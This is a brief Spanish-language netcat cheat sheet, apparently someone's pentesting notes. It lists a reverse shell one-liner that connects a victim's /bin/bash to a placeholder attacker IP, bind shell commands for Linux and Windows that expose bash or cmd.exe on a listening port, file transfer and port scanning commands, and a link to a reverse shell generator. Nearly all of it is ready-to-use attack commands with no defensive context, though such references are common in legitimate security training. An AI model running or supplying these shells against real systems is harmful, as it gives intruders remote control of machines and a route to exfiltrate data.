1. **Shell Inverso** (Victima → Atacante):
    
    
```
# Atacante (escucha):
   nc -nlvp 443
   
# Víctima (se conecta):
   nc -e /bin/bash <IP_ATACANTE> 443
```
    
2. **Transferencia de Archivos**:
    
    
```
# Receptor (escucha):
   nc -nlvp 4444 > archivo.txt
 
# Emisor:
   nc -nv <IP_RECEPTOR> 4444 < archivo.txt
   
```
1. **Escaneo de Puertos**:
    
```
 nc -zv <IP_OBJETIVO> 20-443
```


**Bind Shell **
-e Permite ejecutar programas
-c -c shell commands  as  -e; use /bin/sh to exec
```
#### En el sistema objetivo (víctima):

# Linux:
nc -nlvp 4444 -e /bin/bash
nc -nlvp 4444 -c /bin/bash  #-c solo Linux

# Windows:
nc.exe -nlvp 4444 -e cmd.exe

#### En el atacante:

#Linux
nc -nv <IP_OBJETIVO> 4444

#Windows
nc.exe -nv <IP_OBJETIVO> 4444

```

Recurso de reverse SHELL
https://www.revshells.com/